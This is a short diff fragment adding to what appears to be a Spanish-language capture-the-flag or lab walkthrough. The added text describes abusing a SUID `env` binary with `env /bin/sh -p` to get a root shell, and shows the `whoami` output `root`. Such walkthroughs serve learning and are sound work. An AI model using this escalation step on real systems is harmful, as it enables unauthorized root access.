@@ -77,3 +77,13 @@ Una vez dentro del servidor, primero intento ver los permisos sudo que tiene el 
 /usr/bin/passwd
 /usr/bin/chfn
 ```
+
+Observo que está ek binario `env`, con el binerio `env` nos permite mostrar el entorno actual o ejecutar un comando específico en un entorno modificado, y entonces decido ejecutar una `sh` como propietario para convertirme en `root`:  
+
+```bash
+> env /bin/sh -p
+> whoami
+---
+root
+```
+
